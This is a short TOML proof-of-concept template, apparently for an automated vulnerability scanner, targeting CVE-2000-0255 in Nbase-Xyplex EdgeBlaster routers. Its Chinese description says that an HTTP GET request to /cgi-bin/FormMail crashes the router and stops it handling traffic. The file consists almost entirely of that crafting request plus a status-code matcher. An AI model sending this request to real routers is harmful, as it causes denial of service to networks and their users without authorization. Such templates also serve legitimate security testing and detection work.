[info]
author = "AVE"
description = "向 Nbase-Xyplex EdgeBlaster 路由器发送 HTTP GET 请求扫描 /cgi-bin/FormMail 路径，路由器处理该请求时崩溃导致拒绝服务。触发后目标路由器停止响应正常网络流量。"
id = "POC-AVE-2000-0230"
name = "Nbase-Xyplex EdgeBlaster 路由器拒绝服务漏洞 PoC"
severity = "medium"
tags = [
    "cve-2000-0255",
    "dos",
    "router",
]
vuln_id = [
    "CVE-2000-0255",
    "AVE-2000-0230",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/FormMail"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    500,
]
type = "status"
